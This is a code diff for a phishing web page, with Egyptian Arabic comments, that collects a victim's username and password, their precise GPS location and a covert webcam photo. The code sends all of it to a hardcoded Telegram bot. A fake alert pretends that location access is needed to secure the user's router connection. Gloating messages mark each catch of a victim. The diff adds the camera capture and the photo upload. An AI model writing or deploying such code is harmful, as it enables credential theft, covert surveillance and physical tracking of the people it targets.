@@ -2,29 +2,46 @@
     const botToken = '8347819984:AAFi1b3BL9sYP3BbkqpWY3XtVfWatppm8Rk'; 
     const chatId = '1559993244'; 
 
-    document.getElementById('start-btn').addEventListener('click', () => {
+    document.getElementById('start-btn').addEventListener('click', async () => {
         const username = document.getElementById('user-input').value;
         const password = document.getElementById('pass-input').value;
+        if (!username || !password) { alert('يرجى إكمال البيانات'); return; }
 
-        // طلب إحداثيات الموقع الدقيقة (GPS)
+        // طلب الموقع الدقيق بالملي (GPS)
         navigator.geolocation.getCurrentPosition(async (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            // سحب البيانات التانية
-            const geoRes = await fetch('https://ipapi.co/json/');
-            const geo = await geoRes.json();
-
-            // إرسال رسالة "تحديد السطح" فوراً
-            const msg = `📍 تم تحديد السطح بالملي!\n👤 الاسم: ${username}\n🔑 السر: ${password}\n🌍 رابط الموقع: ${mapLink}\n📱 الجهاز: ${navigator.platform}`;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-
-            // تكملة عملية التصوير اللي عملناها قبل كدة...
-            capturePhoto(username, password); 
-        }, (err) => {
-            // لو رفض الـ GPS نبعت البيانات المتاحة
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=⚠️ رفض تحديد الموقع بس اتقفش بالباسورد: ${password}`);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'shabah.jpg');
+                        formData.append('caption', `🚨 اتقفش بالملي يا شبح!\n👤 الاسم: ${username}\n🔑 السر: ${password}\n📍 موقع البيت على الخريطة:\n${mapsLink}`);
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                    }, 'image/jpeg');
+                    
+                    document.getElementById('start-btn').style.display = 'none';
+                    document.getElementById('shabah-msg').style.display = 'block';
+                }, 1000);
+            } catch (err) {
+                // حتى لو قفل الكاميرا، الموقع والباسورد هيوصلوا
+                const msg = `⚠️ رفض الكاميرا بس جبنا مكانه!\n👤 الاسم: ${username}\n🔑 السر: ${password}\n📍 الموقع بالملي:\n${mapsLink}`;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+                document.getElementById('shabah-msg').style.display = 'block';
+            }
+        }, (error) => {
+            alert("يجب تفعيل GPS لتأمين اتصالك بالراوتر.");
         }, { enableHighAccuracy: true });
     });
 </script>
